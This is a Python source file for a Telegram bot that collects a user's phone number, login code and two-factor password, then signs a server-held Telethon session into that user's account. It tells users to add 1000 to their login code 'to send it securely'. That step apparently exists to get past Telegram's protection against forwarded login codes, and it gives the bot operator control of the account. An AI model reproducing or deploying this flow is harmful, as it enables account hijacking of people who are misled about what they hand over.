import logging

from telegram import KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import ContextTypes, ConversationHandler
from telethon.errors import (
    FloodWaitError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)

from telegram_bot.telegram_utils import create_telegram_client

logger = logging.getLogger(__name__)

# Conversation states
SHARE_CONTACT, ENTER_CODE, ENTER_PASSWORD = range(3)

# Obfuscation constant
OBFUSCATION_CONSTANT = 1000


async def authorize(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the authorization process by requesting contact sharing."""
    contact_button = KeyboardButton("Share Contact", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text(
        "Please share your contact to authorize. This will provide your phone number securely.",
        reply_markup=reply_markup
    )
    return SHARE_CONTACT


async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the shared contact and initiate authorization."""
    user_id = update.effective_user.id
    contact = update.message.contact
    
    if not contact:
        await update.message.reply_text("No contact received. Please try /authorize again.")
        return ConversationHandler.END

    phone_number = contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    context.user_data['phone_number'] = phone_number
    context.user_data['session_name'] = f"session_{user_id}"  # Unique session per user

    try:
        client = create_telegram_client(context.user_data['session_name'])
        context.user_data['client'] = client
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            await update.message.reply_text(
                f"Contact received! Telegram sent a code to {phone_number}. To send it securely, "
                f"add {OBFUSCATION_CONSTANT} to the code (e.g., if the code is 12345, send {12345 + OBFUSCATION_CONSTANT}). "
                "Enter the modified code within 2 minutes. Use /resend if it expires.",
                reply_markup=ReplyKeyboardMarkup([])  # Clear keyboard
            )
            return ENTER_CODE
        else:
            await update.message.reply_text("Already authorized!")
            await client.disconnect()
            return ConversationHandler.END
    except PhoneNumberInvalidError:
        await update.message.reply_text("Invalid phone number. Please try /authorize again.")
        return ConversationHandler.END
    except FloodWaitError as e:
        await update.message.reply_text(f"Too many attempts. Please wait {e.seconds} seconds and try /authorize again.")
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Authorization initiation error: {e}")
        await update.message.reply_text(f"Error: {e}")
        return ConversationHandler.END


async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the obfuscated code input."""
    user_id = update.effective_user.id
    if 'client' not in context.user_data or 'phone_number' not in context.user_data:
        await update.message.reply_text("No active authorization session. Please start with /authorize.")
        return ConversationHandler.END

    client = context.user_data['client']
    phone_number = context.user_data['phone_number']
    
    try:
        obfuscated_code = update.message.text.strip()
        try:
            obfuscated_code = int(obfuscated_code)
            real_code = str(obfuscated_code - OBFUSCATION_CONSTANT)  # Decode the code
        except ValueError:
            await update.message.reply_text("Please send a numeric code. Add {OBFUSCATION_CONSTANT} to the Telegram code and try again.")
            return ENTER_CODE

        await client.sign_in(phone_number, real_code)
        await update.message.reply_text("Authorization successful!")
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
    except PhoneCodeExpiredError:
        await update.message.reply_text(
            "The code has expired. Use /resend to get a new code or /cancel to stop."
        )
        return ENTER_CODE
    except SessionPasswordNeededError:
        await update.message.reply_text("Two-factor authentication enabled. Please enter your password:")
        return ENTER_PASSWORD
    except FloodWaitError as e:
        await update.message.reply_text(f"Too many attempts. Please wait {e.seconds} seconds and try again.")
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Code sign-in error: {e}")
        await update.message.reply_text(
            f"Invalid code or error: {e}. Ensure you added {OBFUSCATION_CONSTANT} to the Telegram code. "
            "Use /resend for a new code or /cancel to stop."
        )
        return ENTER_CODE


async def resend_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Resend the authorization code."""
    client = context.user_data.get('client')
    phone_number = context.user_data.get('phone_number')
    
    if not client or not phone_number:
        await update.message.reply_text("No active authorization session. Please start with /authorize.")
        return ConversationHandler.END
    
    try:
        await client.send_code_request(phone_number, force_sms=False)
        await update.message.reply_text(
            f"A new code was sent to {phone_number}. Add {OBFUSCATION_CONSTANT} to it (e.g., 12345 becomes {12345 + OBFUSCATION_CONSTANT}) "
            "and enter the modified code within 2 minutes."
        )
        return ENTER_CODE
    except FloodWaitError as e:
        await update.message.reply_text(f"Too many attempts. Please wait {e.seconds} seconds and try again.")
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Resend code error: {e}")
        await update.message.reply_text(f"Error resending code: {e}. Try /authorize again.")
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the authorization process."""
    client = context.user_data.get('client')
    if client:
        await client.disconnect()
    context.user_data.clear()
    await update.message.reply_text("Authorization cancelled.")
    return ConversationHandler.END